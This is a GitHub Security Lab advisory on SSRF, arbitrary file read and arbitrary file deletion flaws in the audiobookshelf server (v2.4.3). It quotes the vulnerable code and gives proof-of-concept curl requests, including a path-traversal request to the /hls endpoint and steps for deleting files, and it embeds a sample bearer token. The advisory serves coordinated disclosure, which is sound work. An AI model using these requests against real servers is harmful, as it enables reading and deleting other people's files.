# GHSL-2023-203\_GHSL-2023-204: Several vulnerabilities in audiobookshelf

## Coordinated Disclosure Timeline

* 2023-10-01: Report submitted to maintainer
* 2023-11-01: [Advisory Published](https://github.com/advplyr/audiobookshelf/security/advisories/GHSA-mgj7-rfx8-vhpr#event-116560)

## Summary

Audiobookshelf is vulnerable to server-side request forgery (SSRF), arbitrary file read (AFR) and arbitrary file deletion (AFD) depending on the permissions of the user.

## Project

audiobookshelf

## Tested Version

[v2.4.3](https://github.com/advplyr/audiobookshelf/releases/tag/v2.4.3)

## Details

### Issue 1: SSRF and Arbitrary File Read in [`AuthorController.js`](https://github.com/advplyr/audiobookshelf/blob/d7b2476473ef1934eedec41425837cddf2d4b13e/server/controllers/AuthorController.js#L66) (`GHSL-2023-203`)

Users with the update permission are able to read arbitrary files, delete arbitrary files and send a GET request to arbitrary URLs and read the response.

```
   const payload = req.body // <---- imagePath comes from req.body without sanitization
    if (payload.imagePath !== undefined && payload.imagePath !== req.author.imagePath) {
      if (!payload.imagePath && req.author.imagePath) {
        await CacheManager.purgeImageCache(req.author.id)
        await CoverManager.removeFile(req.author.imagePath) // <---- imagePath is passed to removeFile
      } else if (payload.imagePath.startsWith('http')) {
        const imageData = await AuthorFinder.saveAuthorImage(req.author.id, payload.imagePath) // <---- imagePath is used to make a GET request and its response is saved
        if (imageData) {
          if (req.author.imagePath) {
            await CacheManager.purgeImageCache(req.author.id)
          }
          payload.imagePath = imageData.path
          hasUpdated = true
        }
      } else if (payload.imagePath && payload.imagePath !== req.author.imagePath) {
        if (!await fs.pathExists(payload.imagePath)) {            // < ---- only check for existence of path, thus specifying any local file will result in file read
          Logger.error(`[AuthorController] Image path does not exist: "${payload.imagePath}"`)
          return res.status(400).send('Author image path does not exist')
        }

        if (req.author.imagePath) {
          await CacheManager.purgeImageCache(req.author.id)
        }
      }
    }

```
#### Impact

This issue may lead to `Information Disclosure`.

#### Resources

**SSRF**

1. In order to exploit SSRF, first send a request with the url of the file you wish to download. Curl is messy, so I would just go into the UI and click to edit the author’s image and put in the desired url which will send a PATCH request to `/api/authors/author-id`.
2. Download the file from `api/authors/author-id/image` with the following command:

`curl -i -s -k -X $'GET' \
-H $'Host: localhost:3333' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NmFjZTUxNy01NGJmLTRjYmUtYTBlZC05ZWZkMzZhNWI5NmMiLCJ1c2VybmFtZSI6InRlc3RlciIsImlhdCI6MTY5NTg0ODQ4Mn0.rvF1kTKXHMsjPYV_PtvMnCKNgvXxNrTDTiOIh8yz0hE' -H $'Content-Length: 2' \
--data-binary $'\x0d\x0a' \
$'http://localhost:3333/api/authors/40913999-5739-4c84-bff0-93f9b34a08ef/image?token=JWT_TOKEN&raw=true'`

**Arbitrary File Deletion**

1. In order to exploit arbitrary file deletion, first send a request with the path to the file you wish to delete. Curl is messy, so I would just go into the UI and click to edit the author’s image and put in the path to the file you wish to delete which will send a PATCH request to `/api/authors/author-id`.
2. Then, go into the UI and click to edit the author’s image and put in nothing which will send a PATCH request to `/api/authors/author-id` with an empty imagePath, deleting the file.

### Issue 2: Arbitrary File Read in [`HlsRouter.js`](https://github.com/advplyr/audiobookshelf/blob/d7b2476473ef1934eedec41425837cddf2d4b13e/server/routers/HlsRouter.js#L32) (`GHSL-2023-204`)

Any user (regardless of their permissions) may be able to read files from the local file system due to a path traversal in the `/hls` endpoint.

```
 var streamId = req.params.stream
 var fullFilePath = Path.join(this.playbackSessionManager.StreamsPath, streamId, req.params.file)
 var exists = await fs.pathExists(fullFilePath)
 res.sendFile(fullFilePath)

```
#### Impact

This issue may lead to `Information Disclosure`.

#### Resources

Proof of Concept:

```
curl -i -s -k -X $'GET' \
    -H $'Host: localhost:3333' -H $'Accept: application/json, text/plain, */*' -H $'Authorization: Bearer JWT TOKEN' -H $'Content-Length: 2' \
    --data-binary $'\x0d\x0a' \
    $'http://localhost:3333/hls/whatever/..%2F..%2F..%2F..%2F..%2F..%2F(url encoded full path here)'

```

Note: The `%2F`s are URL-encoded forward slashes (`/`) to prevent confusion with the express regex parser. After traversing back enough directories, we can input the URL-encoded full path of the file we wish to access.

## Credit

These issues were discovered and reported by GHSL team member [@Kwstubbs (Kevin Stubbings)](https://github.com/Kwstubbs). These issues were discovered with the help of CodeQL’s [SSRF](https://codeql.github.com/codeql-query-help/javascript/js-request-forgery/) and [Path Injection](https://codeql.github.com/codeql-query-help/javascript/js-path-injection/) queries.
